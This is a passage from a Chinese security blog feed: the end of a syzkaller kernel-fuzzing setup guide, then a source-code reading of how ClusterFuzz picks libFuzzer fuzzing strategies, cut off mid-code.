nic,model=e1000 \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-nographic \</span><br><span class="line">-pidfile vm.pid \</span><br><span class="line">2&gt;&amp;1 | tee vm.log</span><br></pre></td></tr></table></figure><p>试一下ssh是否能够连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i image/stretch.id_rsa -p 10021  -o &quot;StrictHostKeyChecking no&quot; root@localhost -v</span><br></pre></td></tr></table></figure><h1 id="Go-and-syzkaller"><a href="#Go-and-syzkaller" class="headerlink" title="Go and syzkaller"></a>Go and syzkaller</h1><p>下载配置go</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wget https://golang.org/dl/go1.16.5.linux-amd64.tar.gz</span><br><span class="line"></span><br><span class="line">tar -xvf go1.16.5.linux-amd64.tar.gz</span><br><span class="line"></span><br><span class="line">mv go goroot</span><br><span class="line">mkdir gopath</span><br><span class="line"></span><br><span class="line">export GOPATH=`pwd`/gopath</span><br><span class="line">export GOROOT=`pwd`/goroot</span><br><span class="line">export PATH=$GOPATH/bin:$PATH</span><br><span class="line">export PATH=$GOROOT/bin:$PATH</span><br></pre></td></tr></table></figure><p>下载syzkaller源码并编译，先配置代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export https_proxy=http://XXX.XXX.XXX.XXX:1080</span><br><span class="line"></span><br><span class="line">go get -u -d github.com/google/syzkaller/prog</span><br><span class="line"></span><br><span class="line">cd gopath/src/github.com/google/syzkaller</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>编辑配置文件，路径注意修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vim syz.cfg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;target&quot;: &quot;linux/amd64&quot;,</span><br><span class="line">&quot;http&quot;: &quot;127.0.0.1:56741&quot;,</span><br><span class="line">&quot;workdir&quot;: &quot;/root/gopath/src/github.com/google/syzkaller/workdir&quot;,</span><br><span class="line">&quot;kernel_obj&quot;: &quot;/root/kernel&quot;,</span><br><span class="line">&quot;image&quot;: &quot;/root/image/stretch.img&quot;,</span><br><span class="line">&quot;sshkey&quot;: &quot;/root/image/stretch.id_rsa&quot;,</span><br><span class="line">&quot;syzkaller&quot;: &quot;/root/gopath/src/github.com/google/syzkaller&quot;,</span><br><span class="line">&quot;procs&quot;: 8,</span><br><span class="line">&quot;type&quot;: &quot;qemu&quot;,</span><br><span class="line">&quot;vm&quot;: &#123;</span><br><span class="line">&quot;count&quot;: 4,</span><br><span class="line">&quot;kernel&quot;: &quot;/root/kernel/arch/x86/boot/bzImage&quot;,</span><br><span class="line">&quot;cpu&quot;: 2,</span><br><span class="line">&quot;mem&quot;: 2048</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动syzkaller</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./bin/syz-manager -config=/root/syz.cfg</span><br></pre></td></tr></table></figure><p>假如起不来，就加-debug输出调试信息，看看哪里报错了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/syz-manager -config=/root/syz.cfg -debug</span><br></pre></td></tr></table></figure><h1 id="问题与解决"><a href="#问题与解决" class="headerlink" title="问题与解决"></a>问题与解决</h1><p>1、go没有下载到syzkaller源码问题</p><p>需要设置代理，注意不要设置GO111MODULE环境变量，建议使用<code>export https_proxy=http://ip:port</code>方式进行代理</p><p>2、 qemu的ssh服务没起来</p><p>这个可能是kernel编译的问题，可以尝试重新编译kernel</p><p>make mrproper 之后按步骤再编译一次内核</p><p>3、网卡没起来</p><p><img src="http://pic.giantbranch.cn/pic/1626172138934.png" alt></p><p>后来发现syzkaller的qemu启动命令与测试的qemu命令不一样</p><p>将syzkaller的命令复制出来，并启动qemu</p><p>通过<code>systemctl status networking.service</code>查看网络服务状态</p><p><img src="http://pic.giantbranch.cn/pic/1626172218471.png" alt></p><p>再查看网络接口，然而并没有eth0</p><p><img src="http://pic.giantbranch.cn/pic/1626172231642.png" alt></p><p>最后使用测试qemu的命令启动，之后修改/etc/network/interfaces中的eth0改为enp0s4即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;syzkaller是一种无监督的覆盖引导内核模糊器。&lt;/p&gt;
&lt;p&gt;支持的操作系统：Akaros, FreeBSD, Fuchsia, gVisor, Linux, NetBSD, OpenBSD, Windows.&lt;/p&gt;
&lt;p&gt;对linux的支持最全面&lt;/p&gt;
&lt;h1 
      
    
    </summary>
    
    
      <category term="syzkaller" scheme="https://www.giantbranch.cn/tags/syzkaller/"/>
    
      <category term="内核fuzz" scheme="https://www.giantbranch.cn/tags/%E5%86%85%E6%A0%B8fuzz/"/>
    
  </entry>
  
  <entry>
    <title>ClusterFuzz的bot源码(fuzz engine的选择与调度之libfuzzer)阅读</title>
    <link href="https://www.giantbranch.cn/2021/01/25/ClusterFuzz%E7%9A%84bot%E6%BA%90%E7%A0%81(fuzz%20engine%E7%9A%84%E9%80%89%E6%8B%A9%E4%B8%8E%E8%B0%83%E5%BA%A6%E4%B9%8Blibfuzzer)%E9%98%85%E8%AF%BB/"/>
    <id>https://www.giantbranch.cn/2021/01/25/ClusterFuzz的bot源码(fuzz engine的选择与调度之libfuzzer)阅读/</id>
    <published>2021-01-25T00:00:00.000Z</published>
    <updated>2023-10-13T13:14:33.054Z</updated>
    
    <content type="html"><![CDATA[<h1 id="回顾与总览"><a href="#回顾与总览" class="headerlink" title="回顾与总览"></a>回顾与总览</h1><p>上一次我们选择了fuzz task的代码进行阅读，这次我们进一步深入，看看fuzz engine的选择</p><p>先回到上次说的引擎类：<a href="https://www.giantbranch.cn/2020/05/22/ClusterFuzz%E7%9A%84bot%E6%BA%90%E7%A0%81(fuzz%20task)%E9%98%85%E8%AF%BB/#%E5%BC%95%E6%93%8E%E7%B1%BB">https://www.giantbranch.cn/2020/05/22/ClusterFuzz%E7%9A%84bot%E6%BA%90%E7%A0%81(fuzz%20task)%E9%98%85%E8%AF%BB/#%E5%BC%95%E6%93%8E%E7%B1%BB</a></p><p>注册的时候当时我们有疑问说怎么没有afl，现在在读，除了有afl了，还有一个blackbox</p><p>src/python/bot/fuzzers/init.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def run():</span><br><span class="line">  &quot;&quot;&quot;Initialise builtin fuzzing engines.&quot;&quot;&quot;</span><br><span class="line">  engine.register(&apos;afl&apos;, afl_engine.AFLEngine)</span><br><span class="line">  engine.register(&apos;blackbox&apos;, blackbox_engine.BlackboxEngine)</span><br><span class="line">  engine.register(&apos;honggfuzz&apos;, honggfuzz_engine.HonggfuzzEngine)</span><br><span class="line">  engine.register(&apos;libFuzzer&apos;, libFuzzer_engine.LibFuzzerEngine)</span><br><span class="line">  engine.register(&apos;syzkaller&apos;, syzkaller_engine.SyzkallerEngine)</span><br></pre></td></tr></table></figure><p>现在fuzz_task整个调用路径是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取到任务-&gt;fuzz_task.py中的execute_task-&gt;FuzzingSession-&gt;run()-&gt;engine.get获取具体的引擎类，调用do_engine_fuzzing(engine_impl)  -&gt;  run_engine_fuzzer(engine_impl, self.fuzz_target.binary, sync_corpus_directory, self.testcase_directory) -&gt;</span><br></pre></td></tr></table></figure><p>run_engine_fuzzer中，调用prepare生成FuzzOptions（里面也设置了一些fuzz的策略），之后最后调用下面的函数启动fuzz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">options = engine_impl.prepare(sync_corpus_directory, target_path, build_dir)</span><br><span class="line">fuzz_test_timeout = environment.get_value(&apos;FUZZ_TEST_TIMEOUT&apos;)</span><br><span class="line">  additional_processing_time = engine_impl.fuzz_additional_processing_timeout(</span><br><span class="line">      options)</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">result = engine_impl.fuzz(target_path, options, testcase_directory,</span><br><span class="line">                            fuzz_test_timeout)</span><br></pre></td></tr></table></figure><p>即下面的类中的fuzz的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AFLEngine</span><br><span class="line">BlackboxEngine</span><br><span class="line">HonggfuzzEngine</span><br><span class="line">LibFuzzerEngine</span><br><span class="line">SyzkallerEngine</span><br></pre></td></tr></table></figure><p>先来看libfuzzer</p><h1 id="libfuzzer"><a href="#libfuzzer" class="headerlink" title="libfuzzer"></a>libfuzzer</h1><h2 id="prepare"><a href="#prepare" class="headerlink" title="prepare"></a>prepare</h2><p>先看prepare，首先获取参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arguments = fuzzer.get_arguments(target_path)</span><br></pre></td></tr></table></figure><p>参数就是先看看XXX.options文件是否存在（其中XXX为fuzz_target的名字），存在则返回fuzzer_options（类型FuzzerOptions类），通过fuzzer_options.get_engine_arguments(‘libfuzzer’)获取FuzzerArguments(arguments)，之后通过获取FuzzerArguments的list方法转化为元素为”-%s=%s”的形式的list，之后就是加上rss_limit_mb设置内存限制，还有timeout的设置</p><p>之后获取grammar，这个也是从XXX.options的grammar section中获取的（这个在oss-fuzz中的项目中的options中没找到有这个section，是跟peach相关的，peach的模板的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grammar = fuzzer.get_grammar(target_path)</span><br></pre></td></tr></table></figure><p><img src="http://pic.giantbranch.cn/pic/1611902846319.png" alt></p><p>继续，是生成一个策略池，之后选择策略</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strategy_pool = strategy_selection.generate_weighted_strategy_pool(</span><br><span class="line">        strategy_list=strategy.LIBFUZZER_STRATEGY_LIST,</span><br><span class="line">        use_generator=True,</span><br><span class="line">        engine_name=self.name)</span><br><span class="line">strategy_info = libfuzzer.pick_strategies(strategy_pool, target_path,</span><br><span class="line">                                              corpus_dir, arguments, grammar)</span><br></pre></td></tr></table></figure><h3 id="generate-weighted-strategy-pool"><a href="#generate-weighted-strategy-pool" class="headerlink" title="generate_weighted_strategy_pool"></a>generate_weighted_strategy_pool</h3><p>首先generate_weighted_strategy_pool是根据经验设定好的概率生成策略池</p><p>策略列表如下，还是很多的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LIBFUZZER_STRATEGY_LIST = [</span><br><span class="line">    CORPUS_MUTATION_RADAMSA_STRATEGY,</span><br><span class="line">    RANDOM_MAX_LENGTH_STRATEGY,</span><br><span class="line">    CORPUS_MUTATION_ML_RNN_STRATEGY,</span><br><span class="line">    VALUE_PROFILE_STRATEGY,</span><br><span class="line">    FORK_STRATEGY,</span><br><span class="line">    CORPUS_SUBSET_STRATEGY,</span><br><span class="line">    RECOMMENDED_DICTIONARY_STRATEGY,</span><br><span class="line">    DATAFLOW_TRACING_STRATEGY,</span><br><span class="line">    MUTATOR_PLUGIN_STRATEGY,</span><br><span class="line">    MUTATOR_PLUGIN_RADAMSA_STRATEGY,</span><br><span class="line">    PEACH_GRAMMAR_MUTATION_STRATEGY,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>generate_weighted_strategy_pool函数首先获取环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">distribution = environment.get_value(&apos;STRATEGY_SELECTION_DISTRIBUTION&apos;)</span><br></pre></td></tr></table></figure><p>之后从<code>STRATEGY_SELECTION_DISTRIBUTION</code>这里随机选取一个作为策略</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strategy_selection = utils.random_weighted_choice(distribution_tuples,</span><br><span class="line">                                                    &apos;probability&apos;)</span><br></pre></td></tr></table></figure><p>，否则使用默认的，调用<code>generate_default_strategy_pool</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return generate_default_strategy_pool(strategy_list, use_generator)</span><br></pre></td></tr></table></figure><p>一开始初始化一个StrategyPool类，之后选择生成器，最后就将<code>LIBFUZZER_STRATEGY_LIST</code>中非<code>GENERATORS</code>的策略都加到策略池</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">def generate_default_strategy_pool(strategy_list, use_generator):</span><br><span class="line">  &quot;&quot;&quot;Return a strategy pool representing a selection of strategies for launcher</span><br><span class="line">  to consider.</span><br><span class="line"></span><br><span class="line">  Select strategies according to default strategy selection method.&quot;&quot;&quot;</span><br><span class="line">  pool = StrategyPool()</span><br><span class="line"></span><br><span class="line">  # If use_generator is enabled, decide whether to include radamsa, ml rnn,</span><br><span class="line">  # or no generator (mutually exclusive).</span><br><span class="line">  if use_generator:</span><br><span class="line">    choose_generator(pool)</span><br><span class="line"></span><br><span class="line">  # Decide whether or not to add non-generator strategies according to</span><br><span class="line">  # probability parameters.</span><br><span class="line">  for value in [</span><br><span class="line">      strategy_entry for strategy_entry in strategy_list</span><br><span class="line">      if strategy_entry not in GENERATORS</span><br><span class="line">  ]:</span><br><span class="line">    if do_strategy(value):</span><br><span class="line">      pool.add_strategy(value)</span><br><span class="line"></span><br><span class="line">  logs.log(&apos;Strategy pool was generated according to default parameters. &apos;</span><br><span class="line">           &apos;Chosen strategies: &apos; + &apos;, &apos;.join(pool.strategy_names))</span><br><span class="line">  return pool</span><br></pre></td></tr></table></figure><p>这个choose_generator的功能是通过生成随机数，跟radamsa_prob + ml_rnn_prob比较，假如生成的随机数比较大（比radamsa_prob + ml_rnn_prob大），那就都不选择，  不选用radamsa和ml_rnn（机器学习相关的），假如比较小再调用一次decide_with_probability进行选择radamsa或者是ml_rnn</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># /src/python/bot/fuzzers/engine_common.py</span><br><span class="line">def decide_with_probability(probability):</span><br><span class="line">  &quot;&quot;&quot;Decide if we want to do something with the given probability.&quot;&quot;&quot;</span><br><span class="line">  return random.SystemRandom().random() &lt; probability</span><br><span class="line">  </span><br><span class="line"># /src/python/bot/fuzzers/strategy_selection.py</span><br><span class="line"> def choose_generator(strategy_pool):</span><br><span class="line">  &quot;&quot;&quot;Chooses whether to use radamsa, ml rnn, or no generator and updates the</span><br><span class="line">  strategy pool.&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">  radamsa_prob = engine_common.get_strategy_probability(</span><br><span class="line">      strategy.CORPUS_MUTATION_RADAMSA_STRATEGY.name,</span><br><span class="line">      default=strategy.CORPUS_MUTATION_RADAMSA_STRATEGY.probability)</span><br><span class="line"></span><br><span class="line">  ml_rnn_prob = engine_common.get_strategy_probability(</span><br><span class="line">      strategy.CORPUS_MUTATION_ML_RNN_STRATEGY.name,</span><br><span class="line">      default=strategy.CORPUS_MUTATION_ML_RNN_STRATEGY.probability)</span><br><span class="line"></span><br><span class="line">  if engine_common.decide_with_probability(radamsa_prob + ml_rnn_prob):</span><br><span class="line">    if engine_common.decide_with_probability(</span><br><span class="line">        radamsa_prob / (radamsa_prob + ml_rnn_prob)):</span><br><span class="line">      strategy_pool.add_strategy(strategy.CORPUS_MUTATION_RADAMSA_STRATEGY)</span><br><span class="line">    else:</span><br><span class="line">      strategy_pool.add_strategy(strategy.CORPUS_MUTATION_ML_RNN_STRATEGY)</span><br></pre></td></tr></table></figure><h3 id="libfuzzer-pick-strategies"><a href="#libfuzzer-pick-strategies" class="headerlink" title="libfuzzer.pick_strategies"></a>libfuzzer.pick_strategies</h3><p>接下来看<code>libfuzzer.pick_strategies</code>，里面就是对各种策略处理，实际将策略需要的工作完成，并返回StrategyInfo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">StrategyInfo(fuzzing_strategies, arguments, additional_corpus_dirs,</span><br><span class="line">                      extra_env, use_dataflow_tracing, is_mutations_run)</span><br></pre></td></tr></table></figure><h4 id="DATAFLOW-TRACING-STRATEGY"><a href="#DATAFLOW-TRACING-STRATEGY" class="headerlink" title="DATAFLOW_TRACING_STRATEGY"></a>DATAFLOW_TRACING_STRATEGY</h4><p>对于有DFSAN构建的程序以及策略池中有DATAFLOW_TRACING_STRATEGY，先获取dataflow_binary_path（DFSAN的二进制fuzzer路径），之后判断dataflow_trace_dir是否存在，不存在就不执行这个策略了，存在则添加参数 <code>-data_flow_trace=dataflow_trace_dir</code>，后面再加参数<code>-focus_function=auto</code>，最后将策略的名字添加到fuzzing_strategies</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># Depends on the presense of DFSan instrumented build.</span><br><span class="line">  dataflow_build_dir = environment.get_value(&apos;DATAFLOW_BUILD_DIR&apos;)</span><br><span class="line">  use_dataflow_tracing = (</span><br><span class="line">      dataflow_build_dir and</span><br><span class="line">      strategy_pool.do_strategy(strategy.DATAFLOW_TRACING_STRATEGY))</span><br><span class="line">  if use_dataflow_tracing:</span><br><span class="line">    dataflow_binary_path = os.path.join(</span><br><span class="line">        dataflow_build_dir, os.path.relpath(fuzzer_path, build_directory))</span><br><span class="line">    dataflow_trace_dir = dataflow_binary_path + DATAFLOW_TRACE_DIR_SUFFIX</span><br><span class="line">    if os.path.exists(dataflow_trace_dir):</span><br><span class="line">      arguments.append(</span><br><span class="line">          &apos;%s%s&apos; % (constants.DATA_FLOW_TRACE_FLAG, dataflow_trace_dir))</span><br><span class="line">      arguments.append(&apos;%s%s&apos; % (constants.FOCUS_FUNCTION_FLAG, &apos;auto&apos;))</span><br><span class="line">      fuzzing_strategies.append(strategy.DATAFLOW_TRACING_STRATEGY.name)</span><br><span class="line">    else:</span><br><span class="line">      logs.log_warn(</span><br><span class="line">          &apos;Dataflow trace is not found in dataflow build, skipping strategy.&apos;)</span><br><span class="line">      use_dataflow_tracing = False</span><br></pre></td></tr></table></figure><h4 id="CORPUS-MUTATION"><a href="#CORPUS-MUTATION" class="headerlink" title="CORPUS_MUTATION"></a>CORPUS_MUTATION</h4><p>接下来是Generate new testcase mutations的</p><p>首先看看strategy_pool中是否有CORPUS_MUTATION_ML_RNN_STRATEGY或者CORPUS_MUTATION_RADAMSA_STRATEGY（ML_RNN的优先级高于RADAMSA），有的话is_mutations_run就为True</p><p>is_mutations_run为True，先create_corpus_directory(‘mutations’)创建样本目录，之后生成样本，将使用的策略的名字添加到fuzzing_strategies，最后将new_testcase_mutations_directory添加到additional_corpus_dirs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># Select a generator to attempt to use for existing testcase mutations.</span><br><span class="line">  candidate_generator = engine_common.select_generator(strategy_pool,</span><br><span class="line">                                                       fuzzer_path)</span><br><span class="line">  is_mutations_run = (not environment.is_ephemeral() and</span><br><span class="line">                      candidate_generator != engine_common.Generator.NONE)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"># Generate new testcase mutations using radamsa, etc.</span><br><span class="line">  if is_mutations_run:</span><br><span class="line">    new_testcase_mutations_directory = create_corpus_directory(&apos;mutations&apos;)</span><br><span class="line">    generator_used = engine_common.generate_new_testcase_mutations(</span><br><span class="line">        corpus_directory, new_testcase_mutations_directory,</span><br><span class="line">        project_qualified_fuzzer_name, candidate_generator)</span><br><span class="line"></span><br><span class="line">    # Add the used generator strategy to our fuzzing strategies list.</span><br><span class="line">    if generator_used:</span><br><span class="line">      if candidate_generator == engine_common.Generator.RADAMSA:</span><br><span class="line">        fuzzing_strategies.append(</span><br><span class="line">            strategy.CORPUS_MUTATION_RADAMSA_STRATEGY.name)</span><br><span class="line">      elif candidate_generator == engine_common.Generator.ML_RNN:</span><br><span class="line">        fuzzing_strategies.append(strategy.CORPUS_MUTATION_ML_RNN_STRATEGY.name)</span><br><span class="line"></span><br><span class="line">    additional_corpus_dirs.append(new_testcase_mutations_directory)</span><br></pre></td></tr></table></figure><p>策略的核心函数是generate_new_testcase_mutations，根据candidate_generator使用generate_new_testcase_mutations_using_radamsa（RADAMSA会随机选择corpus_directory中符合大小的样，循环编译2000次）或者generate_new_testcase_mutations_using_ml_rnn函数去生成新的样本，假如生成的样本的数量比原来多，才会返回true</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def generate_new_testcase_mutations(corpus_directory,</span><br><span class="line">                                    new_testcase_mutations_directory,</span><br><span class="line">                                    fuzzer_name, candidate_generator):</span><br><span class="line">  &quot;&quot;&quot;Generate new testcase mutations, using existing corpus directory or other</span><br><span class="line">  methods.</span><br><span class="line"></span><br><span class="line">  Returns true if mutations are successfully generated using radamsa or ml rnn.</span><br><span class="line">  A false return signifies either no generator use or unsuccessful generation of</span><br><span class="line">  testcase mutations.&quot;&quot;&quot;</span><br><span class="line">  generation_timeout = get_new_testcase_mutations_timeout()</span><br><span class="line">  pre_mutations_filecount = shell.get_directory_file_count(</span><br><span class="line">      new_testcase_mutations_directory)</span><br><span class="line"></span><br><span class="line">  # Generate new testcase mutations using Radamsa.</span><br><span class="line">  if candidate_generator == Generator.RADAMSA:</span><br><span class="line">    generate_new_testcase_mutations_using_radamsa(</span><br><span class="line">        corpus_directory, new_testcase_mutations_directory, generation_timeout)</span><br><span class="line">  # Generate new testcase mutations using ML RNN model.</span><br><span class="line">  elif candidate_generator == Generator.ML_RNN:</span><br><span class="line">    generate_new_testcase_mutations_using_ml_rnn(</span><br><span class="line">        corpus_directory, new_testcase_mutations_directory, fuzzer_name,</span><br><span class="line">        generation_timeout)</span><br><span class="line"></span><br><span class="line">  # If new mutations are successfully generated, return true.</span><br><span class="line">  if shell.get_directory_file_count(</span><br><span class="line">      new_testcase_mutations_directory) &gt; pre_mutations_filecount:</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">  return False</span><br></pre></td></tr></table></figure><h4 id="RANDOM-MAX-LENGTH-STRATEGY"><a href="#RANDOM-MAX-LENGTH-STRATEGY" class="headerlink" title="RANDOM_MAX_LENGTH_STRATEGY"></a>RANDOM_MAX_LENGTH_STRATEGY</h4><p>这个就是最大长度策略，首先判断是否已经存在-max_len=参数了，存在就不做任何操作</p><p>假如不存在，则生成一个0到10000范围内的数，作为-max_len的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if strategy_pool.do_strategy(strategy.RANDOM_MAX_LENGTH_STRATEGY):</span><br><span class="line">    max_len_argument = fuzzer_utils.extract_argument(</span><br><span class="line">        existing_arguments, constants.MAX_LEN_FLAG, remove=False)</span><br><span class="line">    if not max_len_argument:</span><br><span class="line">      max_length = random.SystemRandom().randint(1, MAX_VALUE_FOR_MAX_LENGTH)</span><br><span class="line">      arguments.append(&apos;%s%d&apos; % (constants.MAX_LEN_FLAG, max_length))</span><br><span class="line">      fuzzing_strategies.append(strategy.RANDOM_MAX_LENGTH_STRATEGY.name)</span><br></pre></td></tr></table></figure><h4 id="RECOMMENDED-DICTIONARY-STRATEGY"><a href="#RECOMMENDED-DICTIONARY-STRATEGY" class="headerlink" title="RECOMMENDED_DICTIONARY_STRATEGY"></a>RECOMMENDED_DICTIONARY_STRATEGY</h4><p>这是推荐字典策略，函数add_recommended_dictionary</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (strategy_pool.do_strategy(strategy.RECOMMENDED_DICTIONARY_STRATEGY) and</span><br><span class="line">      add_recommended_dictionary(arguments, project_qualified_fuzzer_name,</span><br><span class="line">                                 fuzzer_path)):</span><br><span class="line">    fuzzing_strategies.append(strategy.RECOMMENDED_DICTIONARY_STRATEGY.name)</span><br></pre></td></tr></table></figure><p>add_recommended_dictionary就是从谷歌云下载recommended_dictionary.dict，假如原来有字典则与原来的字典合并，并使用合并后的字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">def add_recommended_dictionary(arguments, fuzzer_name, fuzzer_path):</span><br><span class="line">  